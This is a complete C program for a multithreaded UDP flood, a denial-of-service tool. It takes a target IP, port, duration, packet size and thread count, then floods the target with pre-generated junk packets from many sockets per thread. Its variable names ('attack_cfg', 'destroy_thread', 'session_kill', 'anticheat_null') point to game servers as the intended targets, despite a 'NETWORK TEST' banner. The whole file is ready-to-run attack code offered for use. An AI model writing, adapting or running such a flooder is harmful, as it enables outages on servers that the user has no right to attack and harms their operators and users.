#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <signal.h>
#include <sys/time.h>
#include <fcntl.h>

// CONFIG
#define MAX_PACKET_SIZE 65507
#define MAX_THREADS 2000000
#define PRE_GEN_PACKETS 1000000
#define BATCH_SIZE 524288
#define SOCKETS_PER_THREAD 256
#define MAGIC 0xDEADC0DE
#define DESTROY_MODE 1

#define PORT_MIN 30000
#define PORT_MAX 30100
#define BUFFER_MAX 2097152

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_count;
} attack_config_t;

typedef struct {
    unsigned long long total_packets;
    unsigned long long total_bytes;
    unsigned long long instant_crash;
    unsigned long long memory_destroy;
    unsigned long long network_flood;
    unsigned long long session_kill;
    unsigned long long anticheat_null;
} destroy_stats_t;

volatile sig_atomic_t instant_destroy = 1;
attack_config_t attack_cfg;
char **instant_packets;
struct sockaddr_in target_addr;
socklen_t addr_len;
destroy_stats_t global_destroy;

void signal_handler(int sig) {
    instant_destroy = 0;
    printf("\nSTOPPED!\n");
}

void generate_payload(char *packet, int size, int packet_id, int thread_id) {
    for (int i = 0; i < size; i++) {
        unsigned char instant_byte;
        
        switch ((i + packet_id + thread_id) % 32) {
            case 0: instant_byte = 0xFF; break;
            case 1: instant_byte = 0x00; break;
            case 2: instant_byte = 0x80; break;
            case 3: instant_byte = (packet_id >> 24) & 0xFF; break;
            case 4: instant_byte = (packet_id >> 16) & 0xFF; break;
            case 5: instant_byte = (packet_id >> 8) & 0xFF; break;
            case 6: instant_byte = packet_id & 0xFF; break;
            case 7: instant_byte = (thread_id >> 24) & 0xFF; break;
            case 8: instant_byte = (thread_id >> 16) & 0xFF; break;
            case 9: instant_byte = (thread_id >> 8) & 0xFF; break;
            case 10: instant_byte = thread_id & 0xFF; break;
            case 11: instant_byte = (i >> 24) & 0xFF; break;
            case 12: instant_byte = (i >> 16) & 0xFF; break;
            case 13: instant_byte = (i >> 8) & 0xFF; break;
            case 14: instant_byte = i & 0xFF; break;
            case 15: instant_byte = ~((packet_id + thread_id + i) & 0xFF); break;
            case 16: instant_byte = ((packet_id * 1103515245 + 12345) >> 16) & 0xFF; break;
            case 17: instant_byte = ((thread_id * 214013 + 2531011) >> 16) & 0xFF; break;
            case 18: instant_byte = ((i * 16807) % 2147483647) & 0xFF; break;
            case 19: instant_byte = 0xDE; break;
            case 20: instant_byte = 0xAD; break;
            case 21: instant_byte = 0xC0; break;
            case 22: instant_byte = 0xDE; break;
            case 23: instant_byte = ((packet_id ^ thread_id ^ i) & 0xFF); break;
            case 24: instant_byte = ((packet_id + thread_id + i) & 0xFF); break;
            case 25: instant_byte = ((packet_id * thread_id * i) & 0xFF); break;
            case 26: instant_byte = ~(packet_id & thread_id & i) & 0xFF; break;
            case 27: instant_byte = (packet_id | thread_id | i) & 0xFF; break;
            case 28: instant_byte = (packet_id & thread_id & i) & 0xFF; break;
            case 29: instant_byte = ((packet_id << 3) | (thread_id >> 5)) & 0xFF; break;
            case 30: instant_byte = ((thread_id << 3) | (packet_id >> 5)) & 0xFF; break;
            case 31: instant_byte = ((i << 3) | (i >> 5)) & 0xFF; break;
        }
        
        packet[i] = instant_byte;
    }
    
    if (size > 8) {
        unsigned int instant_sig = MAGIC ^ packet_id ^ thread_id ^ size;
        memcpy(&packet[size - 4], &instant_sig, 4);
    }
}

void init_packets() {
    printf("Generating packets...\n");
    
    instant_packets = malloc(PRE_GEN_PACKETS * sizeof(char*));
    
    for (int i = 0; i < PRE_GEN_PACKETS; i++) {
        instant_packets[i] = malloc(attack_cfg.packet_size);
        generate_payload(instant_packets[i], attack_cfg.packet_size, i, 0);
        
        if (i % 100000 == 0 && i > 0) {
            printf("Generated %d packets...\n", i);
        }
    }
    
    printf("%d packets ready\n", PRE_GEN_PACKETS);
}

int create_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return -1;
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    
    int sndbuf = BUFFER_MAX;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    int priority = 6;
    setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority));
    
    fcntl(sock, F_SETFL, O_NONBLOCK);
    
    return sock;
}

void *destroy_thread(void *arg) {
    int thread_id = *(int*)arg;
    
    int sockets[SOCKETS_PER_THREAD];
    int socket_count = 0;
    
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        int sock = create_socket();
        if (sock >= 0) {
            sockets[socket_count++] = sock;
        }
    }
    
    time_t start_time = time(NULL);
    int packet_index = thread_id * 9973 % PRE_GEN_PACKETS;
    int socket_index = 0;
    
    while (instant_destroy && (time(NULL) - start_time) < attack_cfg.duration) {
        int sock = sockets[socket_index % socket_count];
        
        for (int burst = 0; burst < BATCH_SIZE; burst += 512) {
            for (int p = 0; p < 512; p++) {
                sendto(sock, instant_packets[packet_index], 
                       attack_cfg.packet_size, MSG_DONTWAIT,
                       (struct sockaddr*)&target_addr, addr_len);
                
                __sync_fetch_and_add(&global_destroy.total_packets, 1);
                __sync_fetch_and_add(&global_destroy.total_bytes, attack_cfg.packet_size);
                
                switch (packet_index % 7) {
                    case 0: __sync_fetch_and_add(&global_destroy.instant_crash, 1); break;
                    case 1: __sync_fetch_and_add(&global_destroy.memory_destroy, 1); break;
                    case 2: __sync_fetch_and_add(&global_destroy.network_flood, 1); break;
                    case 3: __sync_fetch_and_add(&global_destroy.session_kill, 1); break;
                    case 4: __sync_fetch_and_add(&global_destroy.anticheat_null, 1); break;
                    case 5: __sync_fetch_and_add(&global_destroy.instant_crash, 1); break;
                    case 6: __sync_fetch_and_add(&global_destroy.memory_destroy, 1); break;
                }
                
                packet_index = (packet_index + 1) % PRE_GEN_PACKETS;
                
                if (p % 64 == 0) socket_index++;
            }
        }
        
        if (DESTROY_MODE == 0) {
            usleep(1);
        }
    }
    
    for (int i = 0; i < socket_count; i++) {
        close(sockets[i]);
    }
    
    return NULL;
}

void *stats_thread(void *arg) {
    time_t last_time = time(NULL);
    unsigned long long last_packets = 0;
    struct timeval start_tv;
    gettimeofday(&start_tv, NULL);
    
    printf("\nTARGET: %s:%d\n", attack_cfg.target_ip, attack_cfg.target_port);
    printf("DURATION: %d seconds\n", attack_cfg.duration);
    printf("PACKET SIZE: %d bytes\n", attack_cfg.packet_size);
    printf("THREADS: %d\n\n", attack_cfg.thread_count);
    
    while (instant_destroy) {
        usleep(500000);
        
        struct timeval current_tv;
        gettimeofday(&current_tv, NULL);
        
        unsigned long long current_packets = global_destroy.total_packets;
        unsigned long long packets_diff = current_packets - last_packets;
        
        double elapsed = (current_tv.tv_sec - start_tv.tv_sec) + 
                        (current_tv.tv_usec - start_tv.tv_usec) / 1000000.0;
        
        double pps = packets_diff * 2;
        double avg_pps = current_packets / elapsed;
        double mbps = (pps * attack_cfg.packet_size * 8) / (1024 * 1024);
        double gbps = mbps / 1024;
        
        printf("\r[%.1fs] PKTS: %llu | RATE: %.0f/s | ", elapsed, current_packets, avg_pps);
        
        if (gbps >= 1.0) {
            printf("%.3f Gbps ", gbps);
        } else {
            printf("%.2f Mbps ", mbps);
        }
        
        printf("| %s:%d", attack_cfg.target_ip, attack_cfg.target_port);
        fflush(stdout);
        
        last_packets = current_packets;
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    printf("\nNETWORK TEST\n");
    printf("============\n\n");
    
    if (argc != 6) {
        printf("USE: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        printf("EX: %s 1.1.1.1 80 60 1400 200000\n\n", argv[0]);
        return 1;
    }
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    attack_cfg.target_ip = argv[1];
    attack_cfg.target_port = atoi(argv[2]);
    attack_cfg.duration = atoi(argv[3]);
    attack_cfg.packet_size = atoi(argv[4]);
    attack_cfg.thread_count = atoi(argv[5]);
    
    if (attack_cfg.duration < 1) attack_cfg.duration = 1;
    if (attack_cfg.duration > 3600) attack_cfg.duration = 3600;
    
    if (attack_cfg.packet_size < 64) attack_cfg.packet_size = 64;
    if (attack_cfg.packet_size > MAX_PACKET_SIZE) {
        attack_cfg.packet_size = MAX_PACKET_SIZE;
    }
    
    if (attack_cfg.thread_count < 1) attack_cfg.thread_count = 1;
    if (attack_cfg.thread_count > MAX_THREADS) {
        attack_cfg.thread_count = MAX_THREADS;
    }
    
    printf("TARGET: %s:%d\n", attack_cfg.target_ip, attack_cfg.target_port);
    printf("DURATION: %d seconds\n", attack_cfg.duration);
    printf("PACKET SIZE: %d bytes\n", attack_cfg.packet_size);
    printf("THREADS: %d\n\n", attack_cfg.thread_count);
    
    printf("STARTING IN 3 SECONDS...\n");
    sleep(3);
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(attack_cfg.target_port);
    
    if (inet_pton(AF_INET, attack_cfg.target_ip, &target_addr.sin_addr) <= 0) {
        printf("INVALID IP\n");
        return 1;
    }
    
    addr_len = sizeof(target_addr);
    
    init_packets();
    
    pthread_t stats_tid;
    pthread_create(&stats_tid, NULL, stats_thread, NULL);
    
    pthread_t *threads = malloc(attack_cfg.thread_count * sizeof(pthread_t));
    int *thread_ids = malloc(attack_cfg.thread_count * sizeof(int));
    
    printf("LAUNCHING %d THREADS...\n", attack_cfg.thread_count);
    
    for (int i = 0; i < attack_cfg.thread_count; i++) {
        thread_ids[i] = i;
        pthread_create(&threads[i], NULL, destroy_thread, &thread_ids[i]);
        
        if (i % 50000 == 0 && i > 0) {
            printf("Launched %d threads...\n", i);
        }
    }
    
    printf("\nALL THREADS ACTIVE!\n\n");
    
    int remaining = attack_cfg.duration;
    while (remaining > 0 && instant_destroy) {
        sleep(1);
        remaining--;
        
        if (remaining % 10 == 0) {
            printf("%d seconds remaining\n", remaining);
        }
    }
    
    instant_destroy = 0;
    printf("\nSTOPPING...\n");
    
    for (int i = 0; i < attack_cfg.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(stats_tid, NULL);
    
    double total_mb = global_destroy.total_bytes / (1024.0 * 1024.0);
    double total_gb = total_mb / 1024.0;
    double avg_pps = global_destroy.total_packets / (double)attack_cfg.duration;
    double avg_mbps = (global_destroy.total_bytes * 8.0) / (attack_cfg.duration * 1024.0 * 1024.0);
    double avg_gbps = avg_mbps / 1024.0;
    
    printf("\n\nDONE!\n");
    printf("======\n");
    printf("TARGET: %s:%d\n", attack_cfg.target_ip, attack_cfg.target_port);
    printf("DURATION: %d seconds\n", attack_cfg.duration);
    printf("TOTAL PACKETS: %llu\n", global_destroy.total_packets);
    printf("TOTAL DATA: %.2f GB\n", total_gb);
    printf("AVG RATE: %.0f packets/sec\n", avg_pps);
    
    if (avg_gbps >= 1.0) {
        printf("AVG BANDWIDTH: %.3f Gbps\n", avg_gbps);
    } else {
        printf("AVG BANDWIDTH: %.2f Mbps\n", avg_mbps);
    }
    
    printf("\nBREAKDOWN:\n");
    printf("  Instant Crash: %llu\n", global_destroy.instant_crash);
    printf("  Memory Destroy: %llu\n", global_destroy.memory_destroy);
    printf("  Network Flood: %llu\n", global_destroy.network_flood);
    printf("  Session Kill: %llu\n", global_destroy.session_kill);
    printf("  Anti-Cheat Null: %llu\n", global_destroy.anticheat_null);
    
    for (int i = 0; i < PRE_GEN_PACKETS; i++) {
        free(instant_packets[i]);
    }
    free(instant_packets);
    free(threads);
    free(thread_ids);
    
    return 0;
}
